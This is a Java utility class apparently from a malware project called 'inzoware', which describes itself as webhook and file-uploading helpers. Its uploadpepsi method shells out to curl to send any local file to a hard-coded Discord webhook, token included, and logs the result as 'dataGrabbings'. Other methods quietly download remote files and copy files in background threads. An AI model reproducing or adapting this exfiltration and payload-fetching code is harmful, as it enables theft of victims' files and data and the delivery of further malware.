// JUST SOME WEBHOOK UTILS/FILE UPLOADING UTILS

package com.inzo.technologies.inzoware.utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.Scanner;

import com.inzo.technologies.inzoware.Main;
import com.inzo.technologies.inzoware.hooks.Hooks374;

import org.apache.commons.io.FileUtils;

public class INZOUtils {
	
	public static String fixedresponse;
	
	public static void uploadpepsi(String loc) throws IOException {
		try {
			Process process = Runtime.getRuntime().exec("curl -i -H 'Expect: application/json' -F \"file=@" + loc + "\" https://discord.com/api/webhooks/926917576427196466/zR6_oyVI5wNVWAtsRgQLIcpE14khRRp92lRWrnprDOISfVhi01LZzSV6GtP5yRKgUOpg");
			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line = "";
			while ((line = reader.readLine()) != null) {
				InitUtils.dataGrabbings = InitUtils.dataGrabbings + "**" + loc + "** " + line + "\n";
			}
		}catch(IOException e) {
			e.printStackTrace();
		}
		
	}
	
	public static void downloadFile(String url, String location) {
		new Thread(() -> {
			try {
				URL src = new URL(url);
				File f = new File(location);
				FileUtils.copyURLToFile(src, f);
			}catch(Exception e) {
				
			}
		}).start();
	}
	
	public static void copyFile(String location, String location2) {
		new Thread(() -> {
			try {
				File src = new File(location);
				File dest = new File(location2);
				FileUtils.copyFile(src, dest);
			}catch(Exception e) {
				
			}
			
		}).start();
	}
	
	
	

}
